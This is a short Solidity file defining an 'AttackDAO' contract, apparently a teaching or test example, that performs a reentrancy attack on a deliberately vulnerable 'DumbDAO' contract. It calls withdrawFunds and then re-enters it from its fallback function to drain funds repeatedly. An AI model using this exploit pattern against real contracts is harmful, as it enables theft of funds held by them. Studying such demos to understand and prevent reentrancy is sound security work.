import 'DumbDAO.sol';
import 'dapple/debug.sol';

contract AttackDAO is Debug {
    bool attackInitiated = false;
    
    function beginAttack(address target) {
        logs('Attack Initiated');
        attackInitiated = true;
        DumbDAO(target).withdrawFunds(this);
    }

    function() {
        if(attackInitiated == true) {
            DumbDAO d = DumbDAO(msg.sender);
            d.withdrawFunds.value(1)(this);
        }
    }
}
